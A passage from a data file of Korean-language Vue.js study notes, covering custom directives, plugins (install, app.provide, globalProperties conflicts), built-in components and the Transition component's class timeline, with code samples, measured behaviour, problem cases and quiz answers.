        body: "커스텀 디렉티브의 훅 일곱은 컴포넌트 생명주기와 같은 이름이지만 대상이 '요소 하나'입니다(실제로 같은 순서). 그래서 적용 대상이 요소여야 하고, 컴포넌트에 걸면 루트 요소에 대리 적용되되 루트가 여럿이면 대상이 없습니다(ㄱ, ㄴ). DOM 조작이라 DOM이 있는 mounted부터 뜻이 있고(ㄷ, ㅋ), 갱신 훅은 전·후 값을 비교해 필요한 일만 하며(ㄹ, ㅌ), 시작한 것은 unmounted에서 끝냅니다(ㅁ, ㅍ). binding은 템플릿을 읽어 만든 스냅샷이라 읽기 전용이고 상태는 요소에 매답니다(ㅂ). 등록 범위는 컴포넌트와 같습니다(ㅅ, ㅇ). DOM 밖의 일(상태·네트워크)은 디렉티브의 영역이 아니라 컴포저블이고(ㅈ), 내장으로 표현되는 DOM 변화는 내장이 낫습니다(ㅊ). 처방은 '이 요소에, DOM API로만 할 수 있는 일'에만 디렉티브를 쓰는 것입니다.",
        code: "디렉티브 = 요소 하나 × 생명주기 훅 7 × DOM 조작\n  대상 = 요소 → 컴포넌트는 단일 루트에 대리 · 다중 루트는 없음 (ㄱ ㄴ)\n  시점 = DOM 있는 mounted 부터 (ㄷ ㅋ) · 갱신은 값 비교 (ㄹ ㅌ) · unmounted 에서 정리 (ㅁ ㅍ)\n  binding = 읽기 전용 스냅샷 · 상태는 el 에 (ㅂ)\n  범위 = 컴포넌트 등록 범위 (ㅅ) · 이름 vXxx (ㅇ)\n\n쓰는 자리: 이 요소에 · DOM API 로만 되는 일   (상태·네트워크 → 컴포저블 ㅈ · class/style → v-bind ㅊ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "컴포넌트·디렉티브·provide를 앱 전체에 한 번에 설치하는 것이 다음 페이지 '플러그인'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 외부 차트 라이브러리를 <canvas v-chart=\"data\">로 붙이려 합니다. 훅 설계는? (2) 그 디렉티브를 <ChartCard v-chart> 컴포넌트에 걸었더니 경고입니다. 어떻게? (3) 클릭 외부 감지(v-click-outside)를 디렉티브로 만들 때 document 리스너의 정리는?",
        notes: [
          {
            title: "답",
            body: "(1) mounted(el, binding)에서 const chart = new Chart(el, binding.value)를 만들고 인스턴스를 WeakMap(el → chart)이나 el.__chart에 둡니다(binding은 읽기 전용). updated(el, binding)에서 binding.value !== binding.oldValue일 때만 chart.update(binding.value)(실제로 updated에 old/new가 옴). unmounted(el)에서 chart.destroy()와 맵 삭제. created나 beforeMount에서는 DOM이 삽입 전이라 크기 측정이 안 됩니다. 함수 꼴은 unmounted가 없어 객체 꼴이어야 합니다. (2) ChartCard의 루트가 둘이면 'Runtime directive used on component with non-element root node…'이고 아예 적용되지 않습니다(실제로 mounted 안 불림). 문서는 컴포넌트에 디렉티브를 권하지 않습니다. ChartCard가 :data prop을 받아 안의 <canvas v-chart=\"data\">에 거는 쪽이 맞습니다. 그러면 루트 수와 무관합니다. (3) mounted에서 const handler = (e) => { if (!el.contains(e.target)) binding.value(e) }를 만들어 document.addEventListener('click', handler)하고, handler를 el에 매달아(el.__clickOutside = handler) unmounted에서 document.removeEventListener('click', el.__clickOutside)로 뗍니다. 정리를 빼면 컴포넌트가 사라져도 document 리스너가 남아 사라진 요소의 contains를 계속 부릅니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Custom Directives", href: `${DOCS}/guide/reusability/custom-directives` },
      { label: "app.directive()", href: `${DOCS}/api/application#app-directive` },
      { label: "SSR — Custom Directives (getSSRProps)", href: `${DOCS}/guide/scaling-up/ssr#custom-directives` },
    ],
  },

  {
    id: "vg-reuse-plugins",
    name: "플러그인",
    tagline: "app.use(plugin, options): install(app, options) 안에서 앱 전체에 깐다",
    intro:
      "재사용성 셋째 페이지입니다. 플러그인은 '앱 수준 기능을 추가하는 자급자족 코드'입니다. 모양은 install(app, options) 메서드를 가진 객체, 또는 install 함수 자체. app.use(myPlugin, { /* options */ })로 설치하면 Vue가 install(app, options)를 부릅니다. 안에서 하는 일: app.component·app.directive로 전역 자산 등록, app.provide로 앱 전체에 값 주입, app.config.globalProperties에 전역 메서드·프로퍼티 추가, 또는 이 셋을 묶은 라이브러리(vue-router). 문서의 예는 i18n 플러그인: globalProperties.$translate = (key) => key.split('.').reduce((o, i) => o?.[i], options)로 템플릿 {{ $translate('greetings.hello') }}. 팁: '전역 프로퍼티는 드물게 쓸 것'(여러 플러그인이 넣으면 혼란). 대안은 app.provide('i18n', options)와 컴포넌트의 inject('i18n'). API 참고서: '같은 플러그인을 여러 번 app.use하면 한 번만 설치된다'. 이 노드는 돌려 본 측정이 적습니다. 플러그인 자체는 install 호출일 뿐이고, 안에서 쓰는 app.component·app.directive·app.provide는 앞 노드들에서 측정했습니다(전역 디렉티브가 자식 템플릿에서 동작, app.provide 값을 inject). 이 노드의 질문은 하나입니다. 앱 전체에 무엇을 어떻게 깔고, 컴포넌트는 그것을 어떻게 받나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "정의: const myPlugin = { install(app, options) { /* 설정 */ } } 또는 function myPlugin(app, options) {}. 설치: import { createApp } from 'vue'; const app = createApp({}); app.use(myPlugin, { /* 선택 옵션 */ }). 흔한 시나리오 넷. 하나, app.component()·app.directive()로 전역 컴포넌트·디렉티브 하나 이상 등록. 둘, app.provide()로 앱 전체에 리소스 주입. 셋, app.config.globalProperties에 전역 인스턴스 프로퍼티·메서드 추가. 넷, 위 조합이 필요한 라이브러리(vue-router). i18n 예: export default { install: (app, options) => { app.config.globalProperties.$translate = (key) => key.split('.').reduce((o, i) => o ? o[i] : null, options) } }. 설치 app.use(i18nPlugin, { greetings: { hello: 'Bonjour!' } }). 템플릿 <h1>{{ $translate('greetings.hello') }}</h1>. 팁: 'globalProperties는 드물게. 다른 플러그인이 넣은 것과 섞이면 혼란'. provide/inject로: install 안 app.provide('i18n', options), 컴포넌트에서 const i18n = inject('i18n'). 배포는 Vite 라이브러리 모드. TS: globalProperties 타입은 ComponentCustomProperties 증강(TS 노드).",
        code: "// plugins/i18n.js\nexport default {\n  install: (app, options) => {\n    app.config.globalProperties.$translate = (key) => key.split('.').reduce((o, i) => o?.[i], options)   // 드물게\n    app.provide('i18n', options)                                                                        // 권장 쪽\n    app.component('I18nText', I18nText).directive('t', tDirective)                                       // 전역 자산\n  },\n}\n\n// main.js\nimport i18nPlugin from './plugins/i18n'\napp.use(i18nPlugin, { greetings: { hello: 'Bonjour!' } })   // install(app, options) · 같은 플러그인은 한 번만\n\n<!-- 컴포넌트 -->\n<h1>{{ $translate('greetings.hello') }}</h1>\n<script setup>const i18n = inject('i18n')</script>\n\n// 함수 꼴\nfunction myPlugin(app, options) { … }   // 객체 없이 install 자체",
        terms: [
          {
            term: "install(app, options)",
            body: "플러그인의 진입점입니다. app.use가 이것을 앱 인스턴스와 옵션으로 부르고, 안에서 앱 인스턴스의 등록·설정 메서드(component, directive, provide, config, mixin, runWithContext)를 씁니다. mount 전에 app.use를 불러야 설치 결과가 트리에 적용됩니다. 같은 플러그인 객체를 두 번 use해도 한 번만 설치됩니다. 플러그인은 Vue에 '등록'되는 것이 아니라 그냥 호출되는 함수라, 앱 인스턴스가 제공하는 것 이상은 할 수 없고 그 이상(라우팅 로직 등)은 플러그인이 스스로 들고 옵니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 플러그인이 쓰는 것들",
        body: "플러그인 자체는 install 호출이라 따로 재지 않았고, 안에서 쓰는 API의 측정을 모았습니다. app.directive('dir', …)로 전역 등록한 디렉티브는 자식 컴포넌트 템플릿에서 동작했고, 컴포넌트의 directives 옵션(로컬)은 자식에서 'Failed to resolve directive'였습니다. 전역 등록이 플러그인의 이유입니다. provide한 값은 깊은 자손과 Teleport 안에서도 inject됐고 서버 렌더에서도 받았습니다. app.provide도 같은 통로의 앱 수준 버전입니다. app.config.globalProperties에 넣은 것은 템플릿 식의 _ctx.이름 해석에서 인스턴스 다음에 찾아지므로 허용 목록 밖 전역(window 등)을 템플릿에 노출하는 통로가 됩니다(템플릿 문법 노드: performance·window는 undefined). app.config는 mount 전에 바꿔야 적용되고(애플리케이션 노드), mount를 두 번 부르면 경고였습니다. useId의 app.config.idPrefix처럼 플러그인이 앱 설정을 바꾸는 것도 install 안에서 합니다.",
        code: "// 플러그인 안에서 쓰는 API 의 측정 (앞 노드들)\napp.directive('dir', …)      → 자식 템플릿에서 동작 (전역)       vs  로컬 directives 옵션 → 자식에서 Failed to resolve directive\napp.provide / provide        → 깊은 자손 · Teleport 안 · SSR 에서 inject ✓\nglobalProperties.$x          → 템플릿 {{ $x }} 해석 (인스턴스 → 전역 프로퍼티) · 허용 목록 밖 전역을 노출하는 통로\napp.config.*                 → mount 전에만 적용 · app.mount 두 번 → 'App has already been mounted.'\napp.config.idPrefix = 'app'  → useId 'app-0'",
        codeLang: "text",
      },
      {
        label: "문제: 두 플러그인이 $t 를 둘 다 넣어 하나가 덮인다",
        body: "i18n 플러그인과 사내 유틸 플러그인이 모두 app.config.globalProperties.$t를 설정합니다. 나중에 설치된 것이 덮어 번역이 깨집니다. 문서의 팁 '전역 프로퍼티는 드물게. 다른 플러그인이 주입한 것과 충돌하면 혼란'이 이 자리입니다. 처방은 provide/inject로 바꾸는 것입니다. install 안에서 app.provide(I18nKey, api)(Symbol 키로 충돌 없음)하고 컴포넌트는 const { t } = inject(I18nKey). 또는 컴포저블 useI18n()이 inject를 감싸면 호출 쪽은 import만 합니다. 전역 프로퍼티가 꼭 필요하면(템플릿 편의) 이름에 접두를 붙이고(\\$i18nT) TS 증강으로 타입을 선언해 겹침을 컴파일에서 잡습니다.",
      },
      {
        label: "문제가 나는 경우: 앱 수준 설치를 잘못 다룰 때",
        body: "경우 ㄱ, 전역 프로퍼티 충돌입니다. 위의 사고입니다. 경우 ㄴ, mount 뒤 app.use. 설치는 되지만 이미 렌더된 트리에 반영 안 됨. mount 전. 경우 ㄷ, install 밖에서 app을 쓰려 함. 플러그인은 install로만 app을 받음. 경우 ㄹ, 옵션을 install 둘째 인자 대신 전역 변수로. 앱마다 다른 옵션 불가. options 인자. 경우 ㅁ, 플러그인이 모듈 전역에 상태를 둠. SSR에서 요청 간 공유. app.provide로 앱마다. 경우 ㅂ, 전역 컴포넌트를 플러그인으로 수십 개 등록. 트리 셰이킹 X(등록 노드). 개별 import 제공. 경우 ㅅ, globalProperties 타입 없음. TS 에러. ComponentCustomProperties 증강. 경우 ㅇ, 같은 플러그인을 두 앱에 쓰며 상태를 플러그인 객체에 둠. 앱 간 공유. install 안에서 앱마다 생성. 경우 ㅈ, app.mixin으로 모든 컴포넌트에 로직 주입. '비권장'. 컴포저블 제공. 경우 ㅊ, 플러그인 안에서 inject를 부름. 컴포넌트 컨텍스트 없음. app.runWithContext(fn)(3.3+). 경우 ㅋ, 플러그인이 window에 전역을 올림. Vue 앱 경계 밖. app.provide. 경우 ㅌ, 플러그인 옵션 검증 없음. 잘못된 옵션에 늦게 터짐. install에서 검증·경고.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ 전역 충돌        $t 둘                              덮어씀                          provide + Symbol · 접두\nㄴ mount 뒤 use     app.mount() 뒤 app.use()            반영 안 됨                       mount 전\nㄷ install 밖       모듈에서 app 참조                   없음                            install(app)\nㄹ 전역 옵션        모듈 변수                           앱마다 다르게 못 함                options 인자\nㅁ 모듈 상태        플러그인 전역 reactive               SSR 요청 간 공유                  app.provide 로 앱마다\nㅂ 전역 컴포넌트 대량  app.component ×N                  트리 셰이킹 X                    개별 export\nㅅ 타입 없음        globalProperties.$x                 TS 에러                         ComponentCustomProperties\nㅇ 플러그인 객체 상태  두 앱                              공유                            install 안 생성\nㅈ mixin 주입       app.mixin                          비권장                          컴포저블\nㅊ 안에서 inject     install 중 inject()                컨텍스트 없음                     app.runWithContext\nㅋ window 전역      window.$x                          앱 경계 밖                      app.provide\nㅌ 옵션 미검증       잘못된 options                      늦게 터짐                        install 에서 검증",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 플러그인은 '앱 인스턴스에 할 일을 함수로 묶은 것' 이라 앱 인스턴스의 한계가 플러그인의 한계다",
        body: "플러그인이 할 수 있는 일은 install이 받는 app이 할 수 있는 일과 같습니다. 전역 자산(component·directive), 주입(provide), 설정(config). 그래서 설치는 mount 전이어야 하고(ㄴ), 앱마다 다른 것은 options와 install 안 생성으로(ㄹ, ㅇ, ㅁ), 전역 자산의 비용(트리 셰이킹 ㅂ)과 전역 프로퍼티의 충돌(ㄱ, ㅅ)은 앱 수준이라 더 넓게 퍼집니다. 컴포넌트 컨텍스트가 필요한 inject는 install 안에 없어 runWithContext가 따로 있습니다(ㅊ). 처방은 플러그인에 '앱 전체에 깔 것'만 두고(설정·provide·꼭 전역인 자산), 로직 재사용은 컴포저블로 export하고, 상태는 install 안에서 앱마다 만들어 provide하는 것입니다.",
        code: "app.use(plugin, options) → plugin.install(app, options)\n  app 이 할 수 있는 것 = 플러그인이 할 수 있는 것:  component · directive (전역 ㅂ) · provide (앱마다 ㅁ ㅇ) · config (충돌 ㄱ ㅅ) · runWithContext (inject ㅊ)\n  mount 전 (ㄴ) · options 로 앱마다 (ㄹ)\n\n플러그인 = 앱 전체에 깔 것만 · 로직은 컴포저블 export · 상태는 install 안 생성 → provide",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "재사용성이 끝났습니다. 다음 장 '내장 컴포넌트'는 Vue가 제공하는 다섯 특수 컴포넌트, Transition·TransitionGroup·KeepAlive·Teleport·Suspense입니다. 실제로 돌려 보면 Transition 클래스가 프레임마다 어떻게 바뀌는지, KeepAlive의 LRU, Teleport의 자리 표시 주석, Suspense의 이벤트 순서를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 사내 디자인 시스템을 Vue 플러그인으로 배포하려 합니다. install에 무엇을 넣고 무엇을 빼야 할까요? (2) 분석(analytics) 플러그인이 현재 사용자 ID를 알아야 하는데, 그것은 컴포넌트 트리 안의 provide로만 있습니다. install에서 어떻게? (3) SSR 앱에서 플러그인이 '현재 로케일' 상태를 들고 있어야 합니다. 어디에 둘까요?",
        notes: [
          {
            title: "답",
            body: "(1) 넣을 것: 테마·설정 옵션을 app.provide(DsKey, normalize(options))로 주입, 꼭 전역이어야 하는 디렉티브(v-tooltip 등) 몇 개의 app.directive, 필요하면 app.config.idPrefix 같은 설정. 뺄 것: 컴포넌트 60개의 app.component 전역 등록(트리 셰이킹을 막음. 개별 export와 자동 import 안내로 대체), globalProperties 남발(충돌. 꼭 필요하면 접두 + ComponentCustomProperties 증강), 플러그인 객체 자체의 상태(두 앱에서 공유됨. install 안에서 생성). (2) install 시점에는 컴포넌트가 없어 inject를 바로 부를 수 없습니다. 둘 중 하나입니다. 사용자 ID도 앱 수준으로 올려 app.provide(UserKey, userRef)하고 플러그인이 같은 키를 app.runWithContext(() => inject(UserKey))(3.3+)로 읽거나, 플러그인이 track(userId) 함수를 provide하고 컴포넌트가 inject해 자기 컨텍스트의 사용자 ID로 부르게 합니다. (3) 모듈 전역에 두면 서버에서 요청 사이에 공유되어 한 사용자의 로케일이 다른 요청에 샙니다(SSR 노드. 실제로 모듈 reactive가 요청 간 누적). install(app, options) 안에서 요청마다 const locale = ref(options.locale)을 만들어 app.provide(LocaleKey, locale)합니다. 앱은 요청마다 새로 만들어지므로 상태도 요청마다 새것입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Plugins", href: `${DOCS}/guide/reusability/plugins` },
      { label: "app.use()", href: `${DOCS}/api/application#app-use` },
      { label: "app.runWithContext()", href: `${DOCS}/api/application#app-runwithcontext` },
    ],
  },

  {
    id: "vg-builtins",
    name: "내장 컴포넌트",
    tagline: "Vue 가 주는 다섯 특수 컴포넌트: 전환, 리스트 전환, 캐시, 이동, 기다림",
    intro:
      "가이드의 다섯째 장, 다섯 페이지입니다. <Transition>(요소 하나의 들어옴·나감에 CSS 클래스·JS 훅), <TransitionGroup>(리스트의 삽입·제거·이동), <KeepAlive>(동적 컴포넌트의 인스턴스 캐시), <Teleport>(DOM의 다른 자리로 이동, 논리 트리는 유지), <Suspense>(비동기 자손이 준비될 때까지 fallback. 실험적). 전부 템플릿에서 등록 없이 쓰고(렌더 함수에서는 import), 트리 셰이킹됩니다. React의 내장 컴포넌트가 '자식의 시간'을 바꿨듯 Vue의 다섯도 자식의 시간(전환 지연, 캐시로 수명 연장, 기다림)과 자리(Teleport)를 바꿉니다. 실제로 돌려 보면 Transition은 enter-from+enter-active → (다음 프레임) enter-active+enter-to → (끝) 클래스 제거였고, TransitionGroup은 재정렬된 항목에 move 클래스를 붙였고, KeepAlive는 max=2에서 가장 오래 안 쓴 인스턴스를 언마운트했고, Teleport는 부모 자리에 <!--teleport start--><!--teleport end--> 주석을 남겼고, Suspense는 pending → fallback → resolve 순으로 이벤트를 냈습니다.",
    blocks: [
      {
        label: "다섯 페이지 한눈에",
        body: "컴포넌트마다 자식에 하는 일과 실제로 돌려 본 것을 붙였습니다.",
        code: "컴포넌트          자식에 하는 일                                    실제로 돌려 본 것\n<Transition>      들어옴·나감에 클래스 6 + 훅 · 자식 하나 · mode out-in    nextTick 'fade-enter-from fade-enter-active' → raf2 'fade-enter-active fade-enter-to' → 150ms '' · key 없으면 전환 없음 · 자식 둘 경고 · out-in: after-leave → before-enter → after-enter\n<TransitionGroup>  리스트 항목마다 전환 + 이동(move) · key 필수 · 래퍼 없음   재정렬 → 전부 'list-move' → 150ms 뒤 제거 · 떠나는 항목 leave-from/active + position:absolute · key 없음 → '<TransitionGroup> children must be keyed.'\n<KeepAlive>       비활성 컴포넌트를 캐시 · include/exclude/max · activated/deactivated   돌아오면 A:1 유지 · max=2 에서 LRU 로 A unmounted → 다시 A:0 · 훅 순서 mounted→activated→deactivated…\n<Teleport>        자식을 다른 DOM 자리로 · 논리 트리 유지 · disabled · defer   부모 자리 '<!--teleport start--><!--teleport end-->' · 안에서 inject ✓ · disabled → 돌아옴 · 없는 타깃 경고 · SSR ctx.teleports\n<Suspense>        비동기 자손 준비까지 fallback · 이벤트 · 실험적            첫 렌더 '로딩…' → 150ms '비동기 setup 끝' · pending → fallback → resolve · SSR 은 기다려 렌더",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 다섯은 '자식의 시간과 자리' 를 바꾸는 래퍼이고, 그래서 자식의 모양에 조건이 있다",
        body: "Transition은 자식의 들어옴·나감 '사이'에 시간을 끼우므로 자식이 하나여야 하고 바뀌는 것이 요소여야(key) 합니다. TransitionGroup은 항목마다 그 시간을 끼우므로 key가 필수입니다. KeepAlive는 자식의 수명을 '언마운트 대신 비활성'으로 늘리므로 활성 자식이 하나여야 하고 name으로 가립니다. Teleport는 자식의 DOM 자리만 바꾸고 논리 자리는 두므로 타깃이 먼저 있어야 합니다. Suspense는 자식의 '준비됨' 시점까지 기다리므로 비동기를 아는 자식(async setup, 비동기 컴포넌트)만 잡습니다. 자식 다섯이 각각입니다.",
        code: "래퍼              바꾸는 것          자식의 조건\nTransition        들어옴·나감 사이 시간   하나 · 바뀌면 key\nTransitionGroup   항목마다 그 시간      key 필수 · 래퍼 tag 선택\nKeepAlive         수명 (비활성 캐시)     활성 하나 · name 으로 include/exclude\nTeleport          DOM 자리            타깃이 먼저 존재 (defer 3.5+)\nSuspense          준비 시점까지 기다림    비동기를 아는 자식만 (async setup · async 컴포넌트)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 'Transition'부터입니다.",
      },
    ],
    sources: [
      { label: "Built-in Components (API)", href: `${DOCS}/api/built-in-components` },
      { label: "Transition", href: `${DOCS}/guide/built-ins/transition` },
    ],
  },

  {
    id: "vg-bi-transition",
    name: "Transition",
    tagline: "요소 하나가 들어오고 나갈 때 여섯 클래스를 프레임 순서대로 붙인다",
    intro:
      "내장 컴포넌트 첫 페이지입니다. <Transition>은 v-if·v-show·<component :is>·key 변경으로 자식이 들어오거나 나갈 때 CSS 클래스를 순서대로 붙여 CSS transition/animation이 걸리게 합니다. 클래스 여섯: v-enter-from, v-enter-active, v-enter-to, v-leave-from, v-leave-active, v-leave-to(name=\"fade\"면 fade-*). 커스텀 클래스(enter-active-class, Animate.css), type, duration, JS 훅(before-enter … after-leave, :css=\"false\"면 done 콜백 필수), appear, mode(out-in / in-out), 요소 사이 전환(key 필요), 재사용 전환 컴포넌트(scoped style 주의). 규칙: '슬롯 자식은 요소나 컴포넌트 하나만'. transform·opacity가 레이아웃을 안 건드려 성능에 좋습니다. 실제로 돌려 보면 v-if로 들어온 <p>는 nextTick에 'fade-enter-from fade-enter-active', 다음 프레임 둘 뒤 'fade-enter-active fade-enter-to', 150ms 뒤 클래스 제거였고, key가 바뀐 span은 leave와 enter 둘이 동시에 존재했고, key 없이 텍스트만 바꾼 요소는 클래스가 없었으며(전환 없음), 자식 둘은 경고 둘, mode=\"out-in\"은 after-leave → before-enter → after-enter 순이었습니다. 이 노드의 질문은 하나입니다. 어느 프레임에 어느 클래스가 있나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<Transition name=\"fade\"><p v-if=\"show\">hello</p></Transition>와 CSS .fade-enter-active, .fade-leave-active { transition: opacity 0.5s } .fade-enter-from, .fade-leave-to { opacity: 0 }. 트리거: v-if, v-show, <component :is>, key 변경. 클래스 타임라인(들어옴): 삽입 직전 enter-from + enter-active → 다음 프레임에 enter-from 제거, enter-to 추가 → transition/animation 끝나면 전부 제거. 나감은 leave-* 대칭. name 없으면 v- 접두. 커스텀: enter-active-class=\"animate__animated animate__tada\"처럼 외부 CSS 라이브러리 클래스. type=\"animation\"|\"transition\"은 둘이 섞였을 때 어느 끝을 기다릴지. :duration=\"550\" 또는 { enter: 500, leave: 800 }. JS 훅 @before-enter @enter(el, done) @after-enter @enter-cancelled @before-leave @leave(el, done) @after-leave @leave-cancelled(v-show만). :css=\"false\"면 CSS 감지를 끄고 done 필수(GSAP 등). appear로 첫 렌더에도. 요소 사이: v-if/v-else로 '한 순간에 하나만' 보이게. 같은 태그면 key로 구분. mode=\"out-in\"(나가는 것 끝난 뒤 들어옴. 보통 이것) / in-out. 동적 :name. key로 강제: <span :key=\"count\">{{ count }}</span>는 count마다 새 요소라 전환, key 없으면 텍스트만 바뀌어 전환 없음. 재사용: <Transition>을 감싼 컴포넌트에 <slot/>, 단 '<style scoped>는 슬롯 내용에 안 먹으니 피할 것'. 성능: transform·opacity.",
        code: "<Transition name=\"fade\" mode=\"out-in\" appear @after-leave=\"onLeft\">\n  <p v-if=\"show\" key=\"a\">hello</p>\n  <p v-else key=\"b\">bye</p>          <!-- 한 순간 하나만 · 같은 태그면 key -->\n</Transition>\n\n<style>\n.fade-enter-active, .fade-leave-active { transition: opacity .3s ease; }\n.fade-enter-from, .fade-leave-to { opacity: 0; }\n</style>\n\n<!-- key 로 강제 전환 (텍스트만 바뀌면 전환 없음) -->\n<Transition><span :key=\"count\">{{ count }}</span></Transition>\n\n<!-- JS 훅 · CSS 끔 -->\n<Transition :css=\"false\" @enter=\"(el, done) => gsap.to(el, { opacity: 1, onComplete: done })\" @leave=\"(el, done) => …\">\n\n<!-- 외부 라이브러리 클래스 · 지속 시간 -->\n<Transition enter-active-class=\"animate__animated animate__tada\" :duration=\"{ enter: 500, leave: 800 }\" type=\"animation\">",
        terms: [
          {
            term: "enter-from · enter-active · enter-to",
            body: "들어오는 요소의 세 단계 클래스입니다. enter-from은 '시작 상태'(삽입 직전에 붙고 한 프레임 뒤 떼어짐. opacity: 0을 둠), enter-active는 '전환 중 내내'(transition 속성과 지속 시간을 둠), enter-to는 '끝 상태'(from이 떼어질 때 붙음. 보통 비움). 브라우저가 from 상태를 그린 뒤 to로 바뀌어야 transition이 걸리므로 '다음 프레임'이 필요합니다. 실제로 돌려 보면 nextTick과 첫 rAF에는 from+active, 둘째 rAF에 active+to, 끝나면 전부 제거였습니다. 나감(leave-*)은 대칭입니다.",
          },
          {
            term: "mode=\"out-in\"",
            body: "두 요소를 바꿀 때 '나가는 것이 끝난 뒤 들어오는 것을 시작'하는 모드입니다. 기본은 둘이 동시에 전환되어 겹치거나 레이아웃이 튑니다(실제로 mode 없이 2 p 동시). out-in은 겹침이 없어 보통 이것을 쓰고, 실제로 돌려 보면 after-leave → before-enter → after-enter 순이었습니다. in-out은 반대로 들어오는 것이 끝난 뒤 나가는 것이 시작되며 드물게 씁니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 .fade-enter-active { transition: opacity 100ms }를 두고 <Transition name=\"fade\"><p v-if=\"show\"></Transition>의 show를 true로 바꿨습니다. await nextTick() 직후 p.className은 'fade-enter-from fade-enter-active', 첫 requestAnimationFrame 뒤에도 같음, 둘째 rAF 뒤 'fade-enter-active fade-enter-to', 150ms 뒤 ''(전부 제거). <span :key=\"count\">의 count를 바꾸니 그 순간 span이 둘 있었고 클래스는 ['fade-leave-from fade-leave-active', 'fade-enter-from fade-enter-active']. 같은 자리의 key 없는 <b>{{ count }}</b>는 className ''로 전환이 없었습니다. <Transition><p>하나</p><p>둘</p></Transition>은 경고 둘: 'Template compilation error: <Transition> expects exactly one child element or component.'와 '<transition> can only be used on a single element or component. Use <transition-group> for lists.' mode=\"out-in\"에 v-if/v-else(key a/b)를 두고 바꾸니 바꾼 직후 p는 하나(A, 나가는 중)였고 이벤트 순서는 before-enter @87ms, after-leave @87ms(100ms 전환이 끝난 뒤 둘이 같은 틱), after-enter @235ms, 끝 텍스트 'B'. mode 없이는 바꾼 직후 p가 둘(동시). 이벤트 핸들러 식에 performance.now()를 적었을 때는 템플릿 허용 목록 밖이라 핸들러가 던져 'Unhandled error during execution of transition hook'과 함께 전환이 멈춰 A가 남았습니다(메서드로 바꾸자 정상).",
        code: "// Chrome 156 · .fade-* { transition: opacity 100ms }\nshow = true →\n  nextTick: 'fade-enter-from fade-enter-active'\n  rAF 1:    'fade-enter-from fade-enter-active'\n  rAF 2:    'fade-enter-active fade-enter-to'\n  150ms:    ''\n<span :key=\"count\"> count 변경 → span 2개: ['fade-leave-from fade-leave-active', 'fade-enter-from fade-enter-active']\n<b>{{ count }}</b> (key 없음)     → '' (전환 없음)\n\n<Transition><p/><p/></Transition>\n  → warn: Template compilation error: <Transition> expects exactly one child element or component.\n  → warn: <transition> can only be used on a single element or component. Use <transition-group> for lists.\n\nmode=\"out-in\" · a → b:  직후 p 1개 (A) · before-enter @87ms · after-leave @87ms · after-enter @235ms · 끝 'B'\nmode 없음:              직후 p 2개 (동시)\n훅 식에 performance.now() → 'Unhandled error during execution of transition hook' · 전환 멈춤 (허용 목록 밖)",
      },
      {
        label: "문제: 숫자가 바뀔 때 페이드가 안 된다",
        body: "<Transition name=\"fade\"><span>{{ count }}</span></Transition>에서 count를 올려도 숫자만 바뀌고 페이드가 없습니다. Transition은 '요소가 들어오고 나갈 때' 동작합니다. 같은 요소의 텍스트만 바뀌면 들어오고 나가는 것이 없습니다. 실제로 돌려 보면 key 없는 요소는 클래스가 하나도 붙지 않았습니다. 처방은 :key=\"count\"입니다. count마다 다른 요소로 취급되어 옛 span이 나가고 새 span이 들어오며 둘에 leave/enter 클래스가 붙습니다(실제로 span 둘 동시). 겹치는 것이 싫으면 mode=\"out-in\". 두 요소가 같은 자리를 차지해 레이아웃이 튀면 position: absolute로 하나를 흐름에서 빼거나 out-in을 씁니다.",
      },
      {
        label: "문제가 나는 경우: 트리거와 프레임을 모를 때",
        body: "경우 ㄱ, key 없이 텍스트 변경입니다. 위의 사고입니다. 경우 ㄴ, 자식 둘. 경고(실제로). 하나로 감싸거나 TransitionGroup. 경우 ㄷ, v-if/v-else가 같은 태그인데 key 없음. 요소가 재사용되어 전환 없음. key. 경우 ㄹ, enter-from에 transition 속성을 둠. active에 둬야 전환 내내 적용. 경우 ㅁ, animation과 transition이 섞였는데 type 없음. 긴 쪽 끝을 기다려 어긋남. type 지정. 경우 ㅂ, :css=\"false\"인데 done을 안 부름. 전환이 안 끝남. done 필수. 경우 ㅅ, 훅 식에 허용 목록 밖 전역. 훅이 던져 멈춤(실제로). 메서드로. 경우 ㅇ, 두 요소가 동시에 전환되어 튐. mode=\"out-in\". 경우 ㅈ, 재사용 전환 컴포넌트에 scoped style. 슬롯 내용에 안 먹음. 전역 또는 :slotted. 경우 ㅊ, height·margin을 전환. 레이아웃 비용. transform·opacity. 경우 ㅋ, 첫 렌더에 전환 기대. appear 필요. 경우 ㅌ, v-show에서 leave-cancelled가 안 온다고 걱정. v-show에만 있음(정상). 경우 ㅍ, 컴포넌트 루트가 여럿인 것을 Transition에. 루트 하나여야.",
        code: "경우               언제 생기나                       겉모습                                           처방\nㄱ key 없음         <span>{{ n }}</span>               클래스 없음 · 전환 없음 (실제로)                   :key=\"n\"\nㄴ 자식 둘         <Transition><p/><p/>               expects exactly one child element… (실제로)        감싸기 · TransitionGroup\nㄷ 같은 태그 분기    v-if/v-else <p>                   재사용 · 전환 없음                                key\nㄹ 속성 위치        .x-enter-from { transition }       한 프레임만                                     -active 에\nㅁ type 미지정      animation + transition             끝 시점 어긋남                                   type\nㅂ done 누락       :css=\"false\"                       안 끝남                                        done()\nㅅ 훅 식 전역       @enter=\"performance.now()\"        Unhandled error during execution of transition hook   메서드\nㅇ 동시 전환        mode 없음                          둘 동시 (실제로 2 p)                             out-in\nㅈ scoped 슬롯      재사용 Transition 컴포넌트            안 먹음                                        전역 · :slotted\nㅊ 레이아웃 속성     height 전환                        레이아웃 비용                                   transform · opacity\nㅋ 첫 렌더         마운트 때 기대                      없음                                           appear\nㅌ leave-cancelled   v-if 에서 기대                     v-show 만                                      -\nㅍ 다중 루트 컴포넌트  <Transition><Multi/>              루트 하나 필요                                   요소로 감싸기",
        codeLang: "text",
      },
      {
